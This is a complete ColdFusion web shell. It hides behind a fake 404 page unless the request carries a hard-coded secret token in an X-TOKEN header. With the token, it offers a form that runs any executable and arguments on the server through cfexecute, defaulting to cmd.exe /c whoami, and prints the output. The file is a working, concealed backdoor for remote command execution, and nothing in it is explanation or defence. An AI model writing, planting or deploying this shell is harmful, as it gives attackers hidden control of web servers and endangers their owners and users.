<cfapplication scriptProtect="none">

<cfset secretCode = "9ebc314e6dacf0a6ab1c08c444b3deb50338b188a70cad862a6482d1ae0e5be2" />

<cfset suppliedCode = "" />
<cfif structKeyExists(GetHttpRequestData().headers, "X-TOKEN")>
    <cfset suppliedCode = "#StructFind(GetHttpRequestData().headers, "X-TOKEN")#" />
</cfif>

<cfif ( #suppliedCode# neq secretCode )>
    <cfheader statuscode="404" statustext="Page Not Found" />
    <cfoutput>
	<p> Nothing to see! </p>
    </cfoutput>
    <cfabort />
</cfif>

<html>
<body>

<cfoutput>
	<form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
        <cfif IsDefined("form.cmd")>
        Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"><br>
		Arguments:  <Input type="text" name="op" value=""><br>
        <cfelse>
        Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
        Arguments:  <Input type="text" name="op" value="/c whoami"><br>
        </cfif>

        <input type="submit">
    </form>
<cfif IsDefined("form.cmd")>
	<cfsavecontent variable="myVar">
	<cfexecute name = "#Form.cmd#" arguments = "#op#" timeout = "5">
	</cfexecute>
	</cfsavecontent>
	<pre>
	#myVar#
	</pre>
</cfif>
</cfoutput>
</body>
</html>
